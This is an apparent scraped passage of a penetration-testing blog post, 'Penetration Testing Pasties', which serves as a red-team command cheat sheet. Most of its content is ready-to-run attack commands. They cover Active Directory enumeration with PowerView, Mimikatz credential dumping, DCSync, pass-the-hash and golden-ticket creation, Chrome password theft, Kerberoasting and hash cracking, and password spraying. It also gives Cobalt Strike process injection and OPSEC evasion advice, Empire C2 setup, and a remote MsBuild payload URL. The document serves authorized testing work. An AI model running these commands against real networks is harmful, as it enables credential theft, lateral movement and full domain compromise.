userprops_members.csv Find group names 1 Get-NetGroup [-GroupName *admin*] Get group members 1 Get-NetGroupMember [-GroupName \"Domain Admins\"] Find open shares \u2013 Noisy 1 Invoke-ShareFinder -CheckShareAccess Find open (non-default i.e. C$) shares by LDAP source 1 2 3 Invoke-ShareFinder -ComputerADSPath \"LDAP://OU=Servers,OU=IT,DC=domain,DC=com\" -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:windowstempserver_shares.txt Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess Find interesting files 1 powershell Invoke-FileFinder -ComputerName -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv Find hosts where the current user is local admin \u2013 Noisy 1 Find-LocalAdminAccess Get details of all domain computers and export to a CSV file for easy viewing 1 Get-computerproperty -Domain -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}}|export-csv computerprops.csv Get Computers with Unconstrained Delegation 1 Get-NetComputer -Unconstrained |ft -a Get Users & Computers Trusted for Delegation 1 2 3 Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl net * Functions: \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Get-NetDomain - gets the name of the current user's domain Get-NetForest - gets the forest associated with the current user's domain Get-NetForestDomain - gets all domains for the current forest Get-NetDomainController - gets the domain controllers for the current computer's domain Get-NetUser - returns all user objects, or the user specified (wildcard specifiable) Add-NetUser - adds a local or domain user Get-NetComputer - gets a list of all current servers in the domain Get-NetPrinter - gets an array of all current computers objects in a domain Get-NetOU - gets data for domain organization units Get-NetSite - gets current sites in a domain Get-NetSubnet - gets registered subnets for a domain Get-NetGroup - gets a list of all current groups in a domain Get-NetGroupMember - gets a list of all current users in a specified domain group Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add-NetGroupUser - adds a local or domain user to a local or domain group Get-NetFileServer - get a list of file servers used by current domain users Get-DFSshare - gets a list of all distribute file system shares on a domain Get-NetShare - gets share information for a specified server Get-NetLoggedon - gets users actively logged onto a specified server Get-NetSession - gets active sessions on a specified server Get-NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get-NetProcess - gets the remote processes and owners on a remote server Get-UserEvent - returns logon or TGT events from the event log for a specified host Get-ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set-ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue' GPO functions \u00b6 1 2 3 4 5 6 7 8 9 Get-GptTmpl - parses a GptTmpl.inf to a custom object Get-NetGPO - gets all current GPOs for a given domain Get-NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find-GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find-GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get-DomainPolicy - returns the default domain or DC policy User-Hunting Functions: \u00b6 1 2 3 4 Invoke-UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke-StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke-ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke-UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: \u00b6 1 2 3 4 5 Get-NetDomainTrust - gets all trusts for the current user's domain Get-NetForestTrust - gets all trusts for the forest associated with the current user's domain Find-ForeignUser - enumerates users who are in groups outside of their principal domain Find-ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke-MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: \u00b6 1 2 3 4 5 6 7 Invoke-ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke-FileFinder - finds potentially sensitive files on hosts in the local domain Find-LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find-UserField - searches a user field for a particular term Find-ComputerField - searches a computer field for a particular term Get-ExploitableSystem - finds systems likely vulnerable to common exploits Invoke-EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain HarmJ0y PowerView Cheat Sheet PDF HarmJ0y's PowerView 2.0 Tricks Gist Inveigh \u00b6 https://github.com/Kevin-Robertson/Inveigh Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. The main Inveigh LLMNR/NBNS spoofer function. Invoke-Inveigh Privilege Requirements: \u00b6 Elevated Administrator or SYSTEM Features: \u00b6 IPv4 LLMNR/NBNS spoofer with granular control NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB Basic auth cleartext credential capture over HTTP/HTTPS WPAD server capable of hosting a basic or custom wpad.dat file HTTP/HTTPS server capable of hosting limited content Granular control of console and file output Run time control Powershell W/out Powershell \u00b6 MsBuild.exe https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml Get-IndexedItem \u00b6 Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents Sources: https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1 Interacting w/ Windows API \u00b6 https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/ Example \u2013 Lock Workstation and MessageBox \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Add - Type - TypeDefinition @\" using System ; using System . Diagnostics ; using System . Runtime . InteropServices ; public static class User32 { [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool MessageBox ( IntPtr hWnd , /// Parent window handle String text , /// Text message to display String caption , /// Window caption int options ); /// MessageBox type [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool LockWorkStation (); } \"@ [ USER32 ] :: LockWorkStation () List static methods 1 [USER32] |get-member -static MailSniper (OWA and Exchange Enumeration) \u00b6 Source: https://github.com/dafthack/MailSniper MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain. MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS. Bypassing Dual Factor Authentication on OWA \u2013 http://www.blackhillsinfosec.com/?p=5396 It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange. Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.comEWSExchange.asmx Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user's inbox for key terms (by default \" pass \", \" creds \", and \" credentials \"). Locate OWA instances via Autodiscover using only organization primary domain name \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 / Autodiscover / Autodiscover . xml or autodiscover ./ Autodiscover / Autodiscover . xml or dig _autodiscover . _tcp . SRV ; <<>> DiG 9 . 8 . 3-P1 <<>> _autodiscover . _tcp . . org SRV ;; global options : + cmd ;; Got answer : ;; - >> HEADER << - opcode : QUERY , status : NOERROR , id : 45003 ;; flags : qr rd ra ; QUERY : 1 , ANSWER : 1 , AUTHORITY : 0 , ADDITIONAL : 0 ;; QUESTION SECTION : ; _autodiscover . _tcp . . org . IN SRV ;; ANSWER SECTION : _autodiscover . _tcp . . org . 1720 IN SRV 0 0 443 webmail . . org . ;; Query time : 2 msec ;; SERVER : 192 . 168 . 178 . 1 # 53 ( 192 . 168 . 178 . 1 ) ;; WHEN : Thu Dec 1 10 : 40 : 33 2016 ;; MSG SIZE rcvd : 83 DomainPasswordSpray (Internal Windows Domain Password Brute Forcing) \u00b6 Source: https://github.com/dafthack/DomainPasswordSpray DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! Quick Start Guide \u00b6 Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'. 1 Type 'Import-Module Invoke-DomainPasswordSpray.ps1'. The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts. The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016. 1 PowerShell Invoke-DomainPasswordSpray -Password Winter2016 The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt 1 PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Invoke-DomainPasswordSpray Options \u00b6 1 2 3 4 5 UserList - Optional UserList parameter. This will be generated automatically if not specified. Password - A single password that will be used to perform the password spray. PasswordList - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts). OutFile - A file to output the results to. Domain - A domain to spray against. Misc Powershell Pasties \u00b6 List Removeable Drives 1 Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{\"USB_PROCESS_DETECTED: \" + $_.ProviderName + \"`n\"} Random Execution Method 1 2 3 $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"visio.application\", \"system1\")) $docs = $visio.Documents.Add(\"\") $docs.ExecuteLine('CreateObject(\"Wscript.Shell\").Exec(\"cmd.exe\")') Mimikatz \u00b6 https://github.com/gentilkiwi/mimikatz/wiki Attack Methods for Gaining Domain Admin Rights in Active Directory Dump Cleartext Credentials 1 2 3 sekurlsa::wdigest sekurlsa::logonpasswords lsadump::secrets Dump cached domain credentials 1 lsadump::cache Format mscachev2 as $DCC2$10240#username#hash 1 cat 'mscachecreds.txt' | awk -F \":\" {'print \"$DCC2$10240#\"$1\"#\"$2'} Crack mscachev2 format with Hashcat (extremely slow) 1 ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule DCSYNC \u2013 Remote Hash Dumping from a Domain Controller 1 mimikatz lsadump::dcsync /user:domainkrbtgt There is also a CS built-in function for this Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/ Pass the Hash 1 mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden Golden Ticket Creation (File) 1 mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt Golden Ticket Creation (Pass-The-Ticket) \u2013 Create the ticket for your current session 1 mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces: 1 2 3 4 5 6 7 8 /user:ChildDomainControllerMachineName$ /rc4: KRBTGT Hash /sid:Child Domain SID /domain:FQDN of Child Domain /groups:516 /sids:ParentSID-516,S-1-5-9 /id:ID of Child Domain Controller /ptt Dump Google Chrome passwords 1 2 3 4 5 shell copy \"C:userskobrienappdatalocalgooglechromeuser datadefaultLogin Data\" C:userspubliclibrariesld.dat steal_token mimikatz @dpapi::chrome /in:C:userspubliclibrariesld.dat /unprotect Detecting Golden Ticket use on a DC Kerberoast \u00b6 https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt3/ 1 Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/host.domain.com\" Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used) 1 2 mimkatz kerberos::list /export Invoke-Mimikatz -Command 'standard::base64 \"kerberos::list /export\" exit' Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred) 1 proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile Cracking the hashes 1 2 3 ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist= Domain Admin Privesc Methods \u00b6 Attack Methods for Gaining Domain Admin Rights in Active Directory Passwords in SYSVOL & Group Policy Preferences findstr /S cpassword %logonserver%sysvol*.xml or use Get-GPPPasswords.ps1 from PowerSploit Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch Kerberos TGS Service Ticket Offline Cracking (Kerberoast) The Credential Theft Shuffle Gain access to AD Database file (ntds.dit) Backup locations (backup server storage, media, and/or network shares) Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers. With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline. Simple TCP Port Redirection 1 2 socat TCP-LISTEN:80,fork TCP::80 socat TCP-LISTEN:443,fork TCP::443 UDP Port Redirection 1 socat udp4-recvfrom : 53 , reuseaddr , fork udp4-sendto :; echo -ne Simple HTTP Redirect Save as a file like the following as redirect.html and map to root \"/\" on your Team Server. Casual browsing to the root of your domain will then simply redirect. Domain Fronting \u00b6 https://github.com/rvrsh3ll/FindFrontableDomains Cobalt Strike \u00b6 Gettin' Down with Aggressor Script https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna https://github.com/Und3rf10w/Aggressor-scripts 1 portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443 Start Remote Beacon DLL via iwmi 1 powerpick iwmi -class Win32_Process -name create -ArgumentList \"rundll32.exe c:userspubliclibrariessmb_beacon.dll.log0,StartW\" OPSEC Considerations for Beacon Commands \u00b6 Blog.Cobaltstrike.com \u2013 OPSEC Considerations For Beacon Commands A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns-txt mode dns6 mode http note powershell-import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh-key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don't want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script's &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process. spawnas has runas which runs an arbitrary command as another user. powershell has powerpick, this command runs powershell scripts without powershell.exe. It's also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh Powershell Function Wrapper \u00b6 https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/ Persistence Scripts \u00b6 https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna EMPIRE \u00b6 Cheat sheets 1 2 - https://github.com/adaptivethreat/Empire/wiki/Quickstart - https://attackerkb.com/Powershell/Powershell_Empire Clone GIT Repo 1 2 root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire Cloning into 'empire'... Install Empire 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@workstation:~# cd empire/ root@workstation:~/empire# cd setup/ root@workstation:~/empire/setup# ./install.sh Reading package lists... Done Building dependency tree Reading state information... Done ... Successfully installed pydispatcher Cleaning up... [&gt;] Enter server negotiation password, enter for random generation: [*] Database setup completed! root@workstation:~/empire/setup# Start Empire 1 2 root@workstation:~/empire/setup# cd .. root@workstation:~/empire# ./empire Start with REST API for use with Empire Web 1 2 3 ./empire --headless --username admin --password --restport 1337 ./empire --rest --username admin --password --restport 1337 C2 Profiles \u00b6 Edit default client settings in /setup/setup_database.py Example Default Profile 1 \"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en\" BASH \u00b6 BASH loop example 1 2 3 4 for u in ` cat hosts . txt ` ; do echo -n \" [ * ] user: $u\" & amp ;& amp ; proxychains python / usr / local / bin / secretsdump . py domain / username @$ u -hashes aad3b435b51404eeaad3b435b51404ee : 0e493911f561a425e7a905329f4454bf | tee user_brute . log done BASH .bashrc Function Example 1 2 3 function start_sshtunnel() { ssh - A - t - p22 - L 8800 : localhost : 8800 james @123 . 001.123 - t ssh - L 8800 : localhost : 80 james @124 . 125.123 } Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # .bash_profile PATH=$PATH:/home/james/ export PATH alias ls='ls -G' alias grep='grep --color=auto' alias la='ls -AlahG' alias el='sudo $(history -p !!)' alias ll='ls -alF' alias l='ls -CF' alias lg='ls -AlahG |grep $1' alias netstati='lsof -P -i -n' export PS1=\"nn[$(if [[ $? == 0 ]]; then echo \"[$GREEN]\u2713\"; else echo \"[$RED]\u2715\"; fi)[","title":"Penetration Testing Pasties"},{"location":"blogs/2019/01/penetration-testing-pasties/#penetration-testing-pasties","text":"James Tubberville | January 11, 2019 | Tweet This Post: 'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki. As usual, you can find the raw file and get the latest version of tools on our GitHub repository: . Penetration Testing Framework http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html Penetration Testing Execution Standard http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines Good writeup on passive information gathering http://www.securitysift.com/passive-reconnaissance/ Password Breach Database, requires subscription https://leakbase.pw/","title":"Penetration Testing Pasties"},{"location":"blogs/2019/01/penetration-testing-pasties/#foca","text":"","title":"FOCA"},{"location":"blogs/2019/01/penetration-testing-pasties/#maltego","text":"","title":"Maltego"},{"location":"blogs/2019/01/penetration-testing-pasties/#reconng","text":"","title":"ReconNG"},{"location":"blogs/2019/01/penetration-testing-pasties/#metagoofil","text":"Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc. Metagoofil performs the following: Searches the given file type using the Google search engine Downloads all the documents found Extracts metadata from downloaded documents Saves the result in HTML file Perform document metadata searching on target domain using first 200 google results 1 metagoofil -d .com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html","title":"Metagoofil"},{"location":"blogs/2019/01/penetration-testing-pasties/#censysio","text":"Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. Create an account and get an API key for use in ReconNG or manual searching https://censys.io/ipv4?q= Python API 1 2 3 4 5 6 7 8 9 10 # pip install censys import censys.ipv4 c = censys . ipv4 . CensysIPv4 ( api_id = \"Get from MyAccount at censys.io\" , api_secret = \"Get from MyAccount at censys.io\" ) ranges = [ \"X.X.X.0/24\" , \"X.X.X.0/24\" , \"X.X.X.0/24\" ] for range in ranges : results = c . search ( range ) for result in results : for port in result [ \"protocols\" ]: print result [ \"ip\" ] + \",\" + port","title":"censys.io"},{"location":"blogs/2019/01/penetration-testing-pasties/#dsnrecon","text":"Normal dns reverse lookup of IP range with CSV output 1 dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv Perform default enumeration of a domain 1 dnsrecon -d Perform zone transfer attempt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 dnsrecon -t axfr -d \u2570 $ dnsrecon -h Version: 0.8.10 Usage: dnsrecon.py Options: -h, --help Show this help message and exit. -d, --domain Target domain. -r, --range IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask). -n, --name_server Domain server to use. If none is given, the SOA of the target will be used. -D, --dictionary Dictionary file of subdomain and hostnames to use for brute force. -f Filter out of brute force domain lookup, records that resolve to the wildcard defined IP address when saving records. -t, --type Type of enumeration to perform: std SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail. rvl Reverse lookup of a given CIDR or IP range. brt Brute force domains and hosts using a given dictionary. srv SRV records. axfr Test all NS servers for a zone transfer. goo Perform Google search for subdomains and hosts. snoop Perform cache snooping against all NS servers for a given domain, testing all with file containing the domains, file given with -D option. tld Remove the TLD of given domain and test against all TLDs registered in IANA. zonewalk Perform a DNSSEC zone walk using NSEC records. -a Perform AXFR with standard enumeration. -s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration. -g Perform Google enumeration with standard enumeration. -w Perform deep whois record analysis and reverse lookup of IP ranges found through Whois when doing a standard enumeration. -z Performs a DNSSEC zone walk with standard enumeration. --threads Number of threads to use in reverse lookups, forward lookups, brute force and SRV record enumeration. --lifetime Time to wait for a server to response to a query. --db SQLite 3 file to save found records. --xml XML file to save found records. --iw Continue brute forcing a domain even if a wildcard records are discovered. -c, --csv Comma separated value file. -j, --json JSON file. -v Show attempts in the brute force modes.","title":"dsnrecon"},{"location":"blogs/2019/01/penetration-testing-pasties/#theharvester","text":"Perform lookup against with additional DNS reverse on all ranges discovered 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 theharvester -d -c -n -b google -l 1000 [-f output] Usage: theharvester options -d: Domain to search or company name -b: data source: google, googleCSE, bing, bingapi, pgp linkedin, google-profiles, people123, jigsaw, twitter, googleplus, all -s: Start in result number X (default: 0) -v: Verify host name via dns resolution and search for virtual hosts -f: Save the results into an HTML and XML file -n: Perform a DNS reverse query on all ranges discovered -c: Perform a DNS brute force for the domain name -t: Perform a DNS TLD expansion discovery -e: Use this DNS server -l: Limit the number of results to work with(bing goes from 50 to 50 results, -h: use SHODAN database to query discovered hosts google 100 to 100, and pgp doesn't use this option) Examples: theharvester -d microsoft.com -l 500 -b google theharvester -d microsoft.com -b pgp theharvester -d microsoft -l 200 -b linkedin theharvester -d apple.com -b googleCSE -l 500 -s 300","title":"TheHarvester"},{"location":"blogs/2019/01/penetration-testing-pasties/#nmap","text":"https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt Host discovery 1 2 3 4 nmap -sn -n nmap -A (run this second) nmap -sV -F nmap -p- -sV -O -T4 -v7 -sC Open SMB shares 1 nmap --script=smb-enum-shares -p445 Open NFS Shares 1 nmap -p 111,2049 --script nfs-ls,nfs-showmount UDP scan: 1 nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 Anonymous FTP 1 2 nmap -sC -sV -p21 nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 VNC Brute 1 nmap --script=vnc-brute -p5800,5900 Rawr Scan 1 nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web MSSQL Scan 1 nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -oA HTTP Scan 1 nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt -oA","title":"Nmap"},{"location":"blogs/2019/01/penetration-testing-pasties/#ids-evasion","text":"Append extra random data to change default packet lengths 1 \u2013data-length 15 Randomize scan order 1 -randomize-hosts","title":"IDS Evasion"},{"location":"blogs/2019/01/penetration-testing-pasties/#web","text":"","title":"Web"},{"location":"blogs/2019/01/penetration-testing-pasties/#eyewitness","text":"Get the most recent version 1 git clone https://github.com/ChrisTruncer/EyeWitness.git Faster Scan 1 ./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Slow version via proxychains 1 2 3 proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Proxychains specify a remote DNS server http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html On Kali linux its found here: /usr/lib/proxychains3/proxyresolv 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/bin/sh # This script is called by proxychains to resolve DNS names # DNS server used to resolve names DNS_SERVER = 4 .2.2.2 if [ $# = 0 ] ; then echo \" usage:\" echo \" proxyresolv \" exit fi export LD_PRELOAD = libproxychains.so.3 dig $1 @ $DNS_SERVER +tcp | awk '/A.+[0-9]+.[0-9]+.[0-9]/{print $5;}' Use Canary tokens to identify web front-end vulnerabilities In combination with Burp collaborator, identify configuration issues with web front-end appliances For example, issue request to target domain with a custom Host header pointing to your collaborator/canary: Request: 1 2 3 GET / HTTP / 1.1 Host : uniqid.burpcollaborator.net Connection : close Response (on Collaborator): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 GET / HTTP / 1.1 Host : XX.X.XXX.XX:8082 HTTP/1.1 200 Connection Established Date: Tue, 07 Feb 2017 16:32:50 GMT Transfer-Encoding: chunked Connection: close Ok / HTTP/1.1 is unavailable Ok Unknown Command Ok Unknown Command Ok Unknown Command Ok Canarytokens.org Blog \u2013 Targeting HTTP's Hidden Attack Surface","title":"Eyewitness"},{"location":"blogs/2019/01/penetration-testing-pasties/#built-in-commands","text":"View your current user: 1 whoami View information about the current user: 1 2 net user myuser(for a local user) net user myuser /domain (for a domain user) View the local groups: 1 net localgroup View the local administrators: 1 net localgroup Administrators Add a new user: 1 net user myuser mypass /add Add a user in the local Administrators group: 1 net localgroup Administrators myuser /add View the domain name of current machine: 1 2 net config workstation net config server View the name of the domain controller: 1 